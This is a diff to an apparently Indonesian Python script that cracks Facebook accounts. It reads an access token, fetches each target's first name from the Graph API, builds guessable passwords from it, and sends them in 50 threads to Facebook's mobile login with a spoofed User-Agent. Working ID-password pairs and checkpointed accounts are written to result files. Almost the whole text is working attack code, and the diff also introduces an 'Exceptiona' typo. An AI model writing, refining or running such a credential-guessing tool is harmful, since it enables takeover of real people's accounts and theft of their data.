@@ -6,36 +6,38 @@ class AutoB:
 		self.fnd=[]
 		self.cek=[]
 		self.hit=1
-		self.req=requests.Session()
 		self.ken=open('toket/token.txt','r').read()
 		self.u='https://graph.facebook.com/{}'
 		self.main()
 
-	def attk(self,idd):
+	def nama(self,id):
 		try:
-			nem=self.req.get(self.u.format(idd+'/?access_token='+self.ken))
+			nem=requests.get(self.u.format(id+'/?access_token='+self.ken))
 			js=json.loads(nem.text)
 			if ' ' in js['first_name']:
-				name=js['first_name'].split(' ')[0]
+				self.attk(id,js['first_name'].split(' ')[0])
 			else:
-				name=js['first_name']
-			self.lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
-			for x in self.lid:
-				data={'email':idd,'pass':x}
-				re=requests.post('https://mbasic.facebook.com/login',data=data,timeout=5).text
-				if 'save-device' in re or 'm_sess' in re:
-					pen=open('result/found.txt','a')
-					pen.write(f'{idd}|{x}\n')
-					self.fnd.append('ntaps')
-					break
-				elif 'checkpoint' in re:
-					pen=open('result/cek.txt','a')
-					pen.write(f'{idd}|{x}\n')
-					self.cek.append('yaudah gpp')
-					break
-			print(f'\r[CRACK] >> {self.hit}/{len(self.file)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
-			self.hit+=1
+				self.attk(id,js['first_name'])
 		except: pass
+
+	def attk(self,idd,name):
+		lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
+		for x in lid:
+			data={'email':idd,'pass':x}
+			head={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Redmi 4X Build/MMB29M; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'}
+			re=requests.post('https://mbasic.facebook.com/login',data=data,headers=head).text
+			if 'save-device' in re or 'mbasic_logout_button' in re:
+				pen=open('result/found.txt','a')
+				pen.write(f'{idd}|{x}\n')
+				self.fnd.append('ntaps')
+				break
+			elif 'checkpoint' in re:
+				pen=open('result/cek.txt','a')
+				pen.write(f'{idd}|{x}\n')
+				self.cek.append('yaudah gpp')
+				break
+		print(f'\r[CRACK] >> {self.hit}/{len(self.file)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
+		self.hit+=1
 
 	def main(self):
 		print("""
@@ -56,7 +58,7 @@ class AutoB:
 			self.spas=''
 		print()
 		p=ThreadPool(50)
-		p.map(self.attk,self.file)
+		p.map(self.nama,self.file)
 		if 'ntaps' in str(self.fnd) or 'yaudah gpp' in str(self.cek):
 			print("\nFound ["+str(len(self.fnd))+"] CheckPoint ["+str(len(self.cek))+"]")
 		else: print("\n[ :( ] nothing found")
@@ -66,5 +68,5 @@ class AutoB:
 			print("check result saved: result/cek.txt")
 try:
 	AutoB()
-except Exception as FCK:
+except Exceptiona as FCK:
 	print(f'Err: {FCK}')
